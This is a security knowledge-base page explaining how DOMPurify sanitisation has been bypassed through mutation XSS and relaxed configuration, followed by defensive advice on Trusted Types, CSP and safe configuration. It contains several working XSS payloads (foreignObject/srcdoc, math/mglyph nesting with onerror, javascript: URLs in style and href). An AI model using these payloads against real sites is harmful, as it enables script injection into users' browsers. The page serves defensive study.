---
title: DOMPurify Bypass Techniques
slug: dompurify-bypass-techniques
---

> **TL;DR:** DOMPurify is robust by default, but loose configs, mutation XSS via namespace confusion, and `template`/`foreignObject` reparsing have repeatedly produced sanitizer bypasses leading to DOM XSS.

## What it is
DOMPurify sanitises HTML by parsing it into a DOM tree and walking nodes against an allowlist. Most real-world bypasses are not breaks of the walker itself but of the assumption that the *serialised* output, when re-inserted via `innerHTML`, parses to the same tree. The HTML parser switches contexts when crossing into SVG, MathML, or `<template>` content, and elements like `<foreignObject>` can re-enter HTML parsing — this round-trip (mutation XSS, or mXSS) is the recurring root cause. Misconfigurations (`ALLOWED_ATTR` including `style`/`on*`, `RETURN_TRUSTED_TYPE` disabled, custom hooks that add attributes) widen the surface.

## Preconditions / where it applies
- Output passed through DOMPurify is then assigned to `.innerHTML`, `insertAdjacentHTML`, or rendered server-side and parsed client-side
- DOMPurify version predates the relevant fix (mXSS bypasses cluster around 2.0.x, 2.2.x, 2.4.x, 3.0.x — check the CHANGELOG)
- Custom config relaxes defaults: `ALLOW_UNKNOWN_PROTOCOLS`, `ALLOWED_URI_REGEXP`, `SAFE_FOR_TEMPLATES: false`, custom `uponSanitizeElement` hooks
- Browser-specific quirks: mXSS exploits often only fire in Chromium or Firefox, not both

## Technique
Namespace confusion via `foreignObject` re-entering HTML parsing:

```javascript
const dirty = `<svg><foreignObject><iframe srcdoc="<script>alert(origin)</script>"></iframe></foreignObject></svg>`;
const clean = DOMPurify.sanitize(dirty);
document.body.innerHTML = clean;
```

Template reparsing — `<template>` content is parsed in a separate document fragment, and certain element nestings survive sanitisation but re-mutate on insertion:

```javascript
const dirty = `<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>`;
document.body.innerHTML = DOMPurify.sanitize(dirty);
```

Style-attribute leakage when `ALLOWED_ATTR` is widened:

```javascript
DOMPurify.sanitize(`<p style="background:url('javascript:alert(1)')">x</p>`,
  { ALLOWED_ATTR: ["style"] });
```

Custom-element / unknown-tag abuse when `ALLOW_UNKNOWN_PROTOCOLS` is true:

```javascript
DOMPurify.sanitize(`<a href="javascript&colon;alert(1)">x</a>`,
  { ALLOW_UNKNOWN_PROTOCOLS: true });
```

The repeatable pattern: find a parser-context transition (HTML → SVG → HTML, or HTML → template → HTML) where the sanitised serialisation, when re-parsed, produces a different tree than DOMPurify saw. Tools like `domgoat` and Cure53's regression test suite enumerate known vectors.

## Detection and defence
- Always run the latest DOMPurify (3.2.x at time of writing) and enable Dependabot for the package
- Pass output to `RETURN_TRUSTED_TYPE: true` and enforce Trusted Types via CSP (`require-trusted-types-for 'script'`) — defence in depth even if the sanitizer fails
- Prefer assigning the returned `DocumentFragment` (`RETURN_DOM_FRAGMENT: true`) and appending it rather than round-tripping through `innerHTML`
- Lock down config: do not add `style`, `srcdoc`, `formaction`, `xlink:href`, `action` to `ADD_ATTR`; do not relax `FORBID_TAGS` defaults
- Add CSP: `script-src 'self'` with nonces, no `unsafe-inline`, `unsafe-eval`
- Fuzz integration points with known mXSS corpora as part of CI

## References
- [DOMPurify changelog](https://github.com/cure53/DOMPurify/blob/main/CHANGELOG.md) — every release lists bypass fixes
- [Cure53 mXSS paper](https://cure53.de/fp170.pdf) — foundational research on mutation XSS

See also: [[dom-xss]], [[cross-site-scripting]], [[trusted-types-bypass]], [[content-security-policy-bypass]].
